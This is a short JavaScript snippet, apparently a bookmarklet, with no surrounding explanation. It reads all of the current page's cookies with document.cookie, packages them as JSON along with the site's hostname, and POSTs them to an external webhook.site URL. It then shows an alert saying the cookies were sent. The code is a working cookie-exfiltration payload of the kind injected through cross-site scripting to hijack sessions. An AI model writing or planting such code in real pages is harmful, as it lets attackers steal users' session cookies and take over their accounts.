    try {
        const formattedCookies = document.cookie.split(';').map(cookie => {
            const [name, value] = cookie.trim().split('=');
            return {
                name: name.trim(),
                value: value.trim(),
                domain: location.hostname,
                path: '/',
                expires: undefined, // Some browsers do not expose this information
                httpOnly: false, // This information is not accessible via JavaScript
                secure: location.protocol === 'https:' // Assume secure if the page is loaded over HTTPS
            };
        });

        var xhr = new XMLHttpRequest();
        var url = "https://webhook.site/caf0d5c2-0ea6-403f-8e1e-e766d8f07cb7";
        xhr.open("POST", url, true);
        xhr.setRequestHeader("Content-Type", "application/json");
        var data = JSON.stringify({ "cookies": formattedCookies });
        xhr.send(data);
        alert('POST request sent with the cookies of the current website.');
    } catch (error) {
        console.error('Error executing bookmarklet:', error);
    }
